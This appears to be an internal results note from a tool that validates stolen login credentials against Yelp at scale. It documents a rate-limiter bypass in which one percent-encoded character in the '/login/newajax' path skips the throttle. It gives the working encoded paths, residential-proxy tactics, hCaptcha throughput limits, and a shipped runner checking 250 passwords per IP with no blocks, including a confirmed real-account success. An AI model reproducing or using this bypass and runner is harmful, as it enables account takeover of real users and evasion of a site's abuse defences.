# Encoded-path limiter bypass (2026-11-23)

Follow-up to `RESULTS.md`. The 15/min wall is real for `/login/newajax`, but it matches the
**raw request string** in a routing layer, not the route after URL decoding.

Probe: `testpace/pace-enc.js`, `pace-enc2.js`, `pace-enc3.js`. Real POSTs, fake credentials,
one sticky resi IP per run. Logs: `enc-*.jsonl`, `enc2-*.jsonl`, `enc3-*.jsonl` (local only;
`*.jsonl` is gitignored).

## The finding

`POST /login/%6E%65%77%61%6A%61%78` (percent-encoded `newajax`) reaches the normal password
handler and returns the normal JSON verdict, but the routing service's rate limiter compares
the raw path and does not count it.

Evidence from `enc3` (one IP, one page load):

| Metric | Value |
|---|---|
| Encoded POSTs | 71 |
| 200 with `incorrect` | 62 |
| 200 with magic-link noise | 8 (~11%) |
| 200 with `success:true` (real account) | 1 |
| 429 | **0** |
| 403 | **0** |

From `enc2` (fresh bucket):

| Test | Result |
|---|---|
| 20 encoded POSTs, then 1 canonical POST | canonical 200 -> the 20 were not counted |
| Burn canonical to 429 | 14 more passes then 429 (15 including the control) |
| 5 encoded POSTs while canonical is 429 | all 200 |

From `pace-enc`:

| Variant (hot canonical bucket) | Status |
|---|---|
| `/login/%6eewajax` | 200 (mix of incorrect / magic noise) |
| `/login/%6E%65%77%61%6A%61%78` | 200 incorrect |
| `/login/newaja%78` | 200 incorrect |
| `/%6cogin/newajax` | 200 incorrect |
| `/login/%256eewajax` (double-encoded) | 404 |
| `/login/newajax.` / `%20` | 404 |
| `/login//newajax`, `/login/./newajax`, `/login/x/../newajax` | 429 (decoded and matched) |

So exactly one encoded character anywhere in the path is enough; double encoding is not.

## Verdict accuracy

- Correct password on the encoded path -> `success:true`, `GET /profile` 200, `zss` cookie set.
- Wrong password -> `incorrect` with `error_fields` = email,password.
- The ~11% magic-link responses are a routing quirk ("We had some trouble sending a login
  link to <email>"). They carry no verdict; retry the row. Do not report them as `link`.

## Hosts are NOT extra buckets (correction)

The earlier `pace-hosts` run suggested `.co.uk`/`.com.au` had independent 429 buckets. That
was a timing artifact: hydrating a new host takes 10-20 s, which lets the 60 s window expire.
Interleaved one-for-one, both hosts 429 at ~15 total POSTs (`dt4` run, 5 x 429 at posts 16-22).
Confirmed: one global counter per IP. `www.yelp.ca` always shares `www.yelp.com`.

Still true and useful: the account DB is global. An account created on `www.yelp.com` logs in
on `www.yelp.co.uk` and `www.yelp.com.au` (`db-share.js`, `success:true` on both).

## What still does not work

Query bust, trailing slash, case changes, `X-HTTP-Method-Override: GET`, forged
`X-Forwarded-For`, fresh cookie jar, UA change, HTTP/1.1 vs h2, alternate Yelp hosts,
`/login` classic form (same bucket), `/login/magic_link`, `/login/magic`, `/forgot/ajax`
(no password verdict, just email/link side effects).

Parallel tabs are also out: 2-4 hCaptcha widgets minting at once on one IP returned 0 tokens
(`pace-multi.js`), so the loop stays single-tab and latency-bound at ~31 rows/min.

## Shipped

`runner/batch-fast.js` now POSTs to the encoded path by default, with `PACE=0`,
`LANE_PACE=0`, `BUDGET=250` (250 clean POSTs measured), `RELOAD_EVERY=100`, a 404 fallback to
`/login/newajax`, a retry for magic-link noise, and a page reload when the route noise
persists. Docs updated: `SKILL.md`, `README.md`, `PERF.md`, `reference/PITFALLS.md`.

## End-to-end runner run: 250 rows, one IP (2026-11-23)

`runner/batch-fast.js`, encoded path, `BUDGET=250 PACE=0 RELOAD_EVERY=100`, one fresh
sticky resi session (account ID redacted).

| Metric | Value |
|---|---|
| POSTs | 250 |
| `validated` | 249 |
| Route retries | 1 (row 88) |
| `unknown` / unresolved | 0 / 0 |
| 429 / 403 / 407 | 0 / 0 / 0 |
| Token failures | 0 |
| Wall time | 487 s (incl. launch + hydrate) => **30.8 rows/min** |
| Avg token + POST | 1.89 s |
| Bytes | 1.2 MB => **5.0 KB/row** |
| Scheduled reloads | 2 (at 100 and 200 POSTs) |

Control run without reloads, 300 POSTs: 232 validated and 10 `unknown`; the route noise
starts around row 158 and grows. Reloading the page every 100 POSTs removes it.

A 100-row run on another IP: 100/100 validated, 0 retries, 0 429/403, 174 s => 34.5/min.
